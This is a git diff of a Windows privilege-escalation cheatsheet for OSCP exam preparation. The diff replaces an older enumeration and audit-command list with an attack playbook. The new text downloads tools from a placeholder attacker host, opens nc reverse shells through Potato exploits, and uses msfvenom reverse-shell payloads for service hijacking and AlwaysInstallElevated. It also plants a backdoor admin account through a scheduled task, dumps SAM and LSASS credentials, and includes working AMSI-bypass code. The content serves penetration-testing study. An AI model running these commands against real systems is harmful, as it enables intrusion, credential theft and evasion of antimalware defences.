@@ -1,193 +1,268 @@
-# Windows Privilege Escalation Cheatsheet
+<div align="center">
 
-### Well-known SIDs in the Context of Privilege Escalation
+# 🪟 Windows Privilege Escalation
 
-| SID                       | Meaning                |
-|---------------------------|------------------------|
-| S-1-0-0                   | Nobody                 |
-| S-1-1-0                   | Everybody              |
-| S-1-5-11                  | Authenticated Users    |
-| S-1-5-18                  | Local System           |
-| S-1-5-domainidentifier-500 | Administrator         |
+![Windows](https://img.shields.io/badge/OS-Windows-0078d4?style=for-the-badge&logo=windows)
+![OSCP](https://img.shields.io/badge/OSCP-Must_Know-E94560?style=for-the-badge)
 
-Refer to: [PayloadsAllTheThings Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+> **`whoami /priv` and `winPEAS` are your two best friends.**
+
+</div>
 
 ---
 
-## Initial PowerUp.ps1 Import
+## 📋 Quick Checklist
 
-powershell.exe -ExecutionPolicy Bypass
+```
+[ ] whoami /all                             ← privileges + groups
+[ ] systeminfo                              ← OS version + patches
+[ ] wmic qfe list                           ← what's patched?
+[ ] Run winPEAS
+[ ] Check services with weak permissions
+[ ] Check unquoted service paths
+[ ] Check scheduled tasks
+[ ] Hunt credentials in registry
+[ ] Hunt credentials in files
+[ ] Check AlwaysInstallElevated
+[ ] Check SeImpersonatePrivilege           ← Potato exploits!
+```
+
+---
+
+## 1️⃣ Dangerous Privileges
+
+```powershell
+whoami /priv
+```
+
+### 🥔 SeImpersonatePrivilege → Potato Attacks
+
+> **This is the most common Windows PrivEsc in OSCP boxes**
+
+```powershell
+# Check
+whoami /priv | findstr "Impersonate"
+
+# PrintSpoofer (Windows 10 / Server 2019)
+certutil -urlcache -f http://KALI_IP/PrintSpoofer64.exe C:\Temp\ps.exe
+C:\Temp\ps.exe -i -c cmd        # interactive cmd as SYSTEM
+C:\Temp\ps.exe -c "nc.exe KALI_IP 4444 -e cmd"   # reverse shell
+
+# GodPotato (works on almost all Windows versions)
+certutil -urlcache -f http://KALI_IP/GodPotato.exe C:\Temp\gp.exe
+C:\Temp\gp.exe -cmd "nc -e cmd KALI_IP 4444"
+
+# JuicyPotato (Server 2016 / older)
+JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
+```
+
+### 📋 Other Dangerous Privileges
+
+| Privilege | Exploitation Method |
+|-----------|-------------------|
+| `SeImpersonatePrivilege` | PrintSpoofer / GodPotato / JuicyPotato |
+| `SeAssignPrimaryTokenPrivilege` | Potato attacks |
+| `SeBackupPrivilege` | Read any file → dump SAM |
+| `SeDebugPrivilege` | Mimikatz → dump LSASS |
+| `SeTakeOwnershipPrivilege` | Take ownership of any file |
+| `SeLoadDriverPrivilege` | Load malicious driver → SYSTEM |
+
+---
+
+## 2️⃣ Service Binary Hijacking
+
+```powershell
+# Find running services and their binary paths
+Get-WmiObject win32_service | Select Name,State,PathName | Where-Object {$_.State -eq "Running"}
+wmic service get name,pathname,startmode | findstr /i "auto"
+
+# Check permissions on service binary
+icacls "C:\path\to\service.exe"
+# VULNERABLE if you see: Everyone:(F) or BUILTIN\Users:(W)
+
+# Also use PowerUp:
+powershell -ep bypass -c "IEX(iwr http://KALI_IP/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks"
+```
+
+```powershell
+# EXPLOITATION:
+# 1. Generate payload on Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o service.exe
+
+# 2. Replace the binary
+certutil -urlcache -f http://KALI_IP/service.exe "C:\path\to\service.exe"
+
+# 3. Start listener on Kali
+nc -lvnp 4444
+
+# 4. Restart the service
+sc.exe stop SERVICENAME
+sc.exe start SERVICENAME
+# → SYSTEM shell
+```
+
+---
+
+## 3️⃣ Unquoted Service Paths
+
+> **If a service path has spaces and no quotes, Windows searches intermediate paths**
+
+```powershell
+# Find unquoted paths
+wmic service get name,pathname | findstr /i "auto" | findstr /iv "\"" | findstr /iv "C:\Windows"
+
+# Example vulnerable path:
+# C:\Program Files\Vulnerable Service\bin\service.exe
+#
+# Windows searches in order:
+# 1. C:\Program.exe                           ← if writable = instant SYSTEM
+# 2. C:\Program Files\Vulnerable.exe          ← if writable = instant SYSTEM
+# 3. C:\Program Files\Vulnerable Service\bin\service.exe
+
+# Check which directory is writable
+icacls "C:\Program Files\Vulnerable Service"
+
+# Plant payload at writable location
+certutil -urlcache -f http://KALI_IP/shell.exe "C:\Program Files\Vulnerable.exe"
+
+# Restart service → SYSTEM
+sc.exe stop UnquotedSvc && sc.exe start UnquotedSvc
+```
+
+---
+
+## 4️⃣ Scheduled Tasks
+
+```powershell
+# List all scheduled tasks
+schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
+
+# PowerShell
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM"} | Select TaskName,TaskPath
+
+# Find tasks with writable script paths
+# e.g.: Task runs C:\Scripts\backup.bat as SYSTEM
+# Check permissions:
+icacls C:\Scripts\backup.bat
+# If writable — overwrite with payload!
+echo "net user hacker P@ss123 /add" > C:\Scripts\backup.bat
+echo "net localgroup administrators hacker /add" >> C:\Scripts\backup.bat
+# Wait for task to run...
+```
+
+---
+
+## 5️⃣ Registry Credential Hunting
+
+```powershell
+# AutoLogon credentials (gold mine)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# VNC passwords
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+# General password search
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# AlwaysInstallElevated (run MSI as SYSTEM)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+### AlwaysInstallElevated Exploit
+
+```bash
+# If both keys = 0x1:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o shell.msi
+
+# On target:
+certutil -urlcache -f http://KALI_IP/shell.msi C:\Temp\shell.msi
+msiexec /quiet /qn /i C:\Temp\shell.msi
+# → SYSTEM shell
+```
+
+---
+
+## 6️⃣ Credential File Hunting
+
+```powershell
+# Common credential locations
+type "C:\Windows\Panther\unattend.xml"
+type "C:\Windows\Panther\Unattended.xml"
+type "C:\Windows\system32\sysprep.inf"
+type "C:\inetpub\wwwroot\web.config"
+type "C:\xampp\htdocs\config.php"
+
+# PowerShell history (often has creds!)
+type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+# Search for password strings
+findstr /si password *.txt *.xml *.ini *.config C:\
+dir /s /b C:\ | findstr /si "pass*.txt pass*.xml cred*"
+```
+
+---
+
+## 7️⃣ SAM Database Dump
+
+```powershell
+# If SeBackupPrivilege or as Administrator
+reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+
+# Transfer to Kali and extract hashes
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# Or use Mimikatz (needs SeDebugPrivilege)
+mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
+
+# Crack with hashcat (mode 1000 = NTLM)
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## 🤖 Automated Tools
+
+```powershell
+# winPEAS (best all-around)
+certutil -urlcache -f http://KALI_IP/winPEASx64.exe C:\Temp\wp.exe
+C:\Temp\wp.exe
+
+# PowerUp (PowerShell)
+powershell -ep bypass
+IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1')
 Invoke-AllChecks
 
+# Seatbelt (C# enumeration)
+certutil -urlcache -f http://KALI_IP/Seatbelt.exe C:\Temp\sb.exe
+C:\Temp\sb.exe -group=all
+```
 
 ---
 
-## Key Information to Collect
+## 🛡️ AMSI Bypass (Before Loading PowerShell Tools)
 
-1. **Username and Hostname**
-   - `whoami`
-
-2. **Group Memberships of Current User**
-   - `whoami /groups`
-
-3. **Existing Users and Groups**
-   - `net user` or `Get-LocalUser`
-   - `net localgroup` or `Get-LocalGroup`
-   - `Get-LocalGroupMember Users`
-
-4. **OS, Version, Architecture**
-   - `systeminfo`
-
-5. **Network Information**
-   - `ipconfig /all`
-   - `route print`
-   - `netstat -ano`
-
-6. **Installed Applications**
-   - 32bit: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
-   - 64bit: `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
-   - Check 32-bit and 64-bit Program Files directories located in `C:\`
-
-7. **Running Processes**
-   - `Get-Process`
-   - `Get-Process NonStandardProcess | Format-list *`
-   - `Get-Process | Select-Object -Property Name, ProcessName, Path, Id, CPU`
-
-8. **Running Services (IMP)**
-   - Lock for services with non-default paths:  
-     `Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}`
-
-9. **Ranas**
-   - `runas /user:backupadmin cmd`
-   - `Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"`
-
-10. **PowerShell History & Event Viewer Script Block Logging**
-    - `Get-History`
-    - `(Get-PSReadlineOption).HistorySavePath`
-    - `cd C:\Users\<username>\appdata\roaming\microsoft\windows\powershell\psreadline`
-
-    *Script Block:*
-    - Launch Event Viewer via RDP
-    - Expand Applications and Services Logs > Microsoft > Windows > Powershell  
-    - Use right side filter to search for "ScriptBlock"
-
-11. **Enum File System**
-    - `icacls`, `tree /f /a`
-    - `cmdkey /list`
-    - `cd C:\Users\<username>\appdata\roaming\microsoft\windows\powershell\psreadline`
-    - `Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.ini,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
-    - Use `which` as `where` in Linux
+```powershell
+# Paste this in PowerShell BEFORE loading PowerUp, etc.
+$a=[Ref].Assembly.GetTypes()
+foreach($b in $a){
+  if($b.Name -like "*iUtils"){
+    $c=$b.GetFields("NonPublic,Static")
+    foreach($d in $c){
+      if($d.Name -like "*Context"){
+        $e=$d.GetValue($null)
+        $e.m_amsiContext=0
+      }
+    }
+  }
+}
+```
 
 ---
 
-## Tools to Use
-
-- [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
-- [winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe)
-
----
-
-## To-Do List
-
-- Situational Awareness
-- Hidden in Plain View
-- Information Goldmine PowerShell
-- Automated Enumeration
-
----
-
-## Possible Attack Vectors
-
-- Service Binary Hijacking
-- DLL Hijacking
-- Unquoted Service Paths
-- Scheduled Tasks
-- Application version Exploits
-- Windows kernel Exploits
-- Windows Privilege (`whoami /priv`)
-
----
-
-## PowerShell: Bypass AV Policy Change
-
-To change the policy globally:
-
-- `Get-ExecutionPolicy -Scope CurrentUser # Show the Current execution Policy`
-- `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser # Change the EP`
-
-# Audit Commands
-
-## 1. Check Audit Policy Status
-
-View all audit policy settings
-auditpol /get /category:*
-
-List all subcategories for granular audit configuration
-auditpol /list /subcategory:*
-
-## 2. Set/Enable Key Audit Policies
-
-Enable auditing for successful and failed logon attempts
-auditpol /set /subcategory:"Logon" /success:enable /failure:enable
-
-Enable auditing for privilege use
-auditpol /set /subcategory:"Privilege Use" /success:enable /failure:enable
-
-Enable file system object auditing
-auditpol /set /subcategory:"File System" /success:enable /failure:enable
-
-
-## 3. Audit File/Folder Access
-
-- GUI: Right-click folder > Properties > Security > Advanced > Auditing > Add
-- CLI example for setting audit rules on a folder (using icacls):
-  
-icacls "C:\SensitiveData" /setaudit S-1-1-0:(0x1301f)
-
-## 4. Check User and Group Memberships
-
-List all local administrators
-net localgroup administrators
-
-List members of a group
-Get-LocalGroupMember -Group "Administrators"
-
-
-## 5. Check Service and Registry Permissions
-
-List services with unquoted paths (potential privilege escalation risk)
-wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i /v "C:\Program Files\"
-
-Find world-writable registry keys (using accesschk from Sysinternals)
-accesschk.exe -wuv -k HKLM
-
-
-## 6. Check for Missing Patches
-
-List installed hotfixes
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-
-
-## 7. Review Scheduled Tasks
-
-Get scheduled tasks basic info
-schtasks /query /fo LIST /v
-
-Detailed scheduled task info
-Get-ScheduledTask | Get-ScheduledTaskInfo
-
-
-## 8. List Running Processes with Command Lines
-
-Get-WmiObject Win32_Process | select ProcessId,CommandLine | Format-List
-
-
-
-## 9. Review Group Policy Results
-
-gpresult /h C:\gpresult.html
-
-Open the HTML report for reviewing applied policies and audit settings
-
-
-
+<div align="center">
+<sub>Part of <a href="https://github.com/MayanSuthar">NullyBlissful OSCP Prep Series</a> · <a href="https://medium.com/@mayan230848">Read writeups on Medium</a></sub>
+</div>
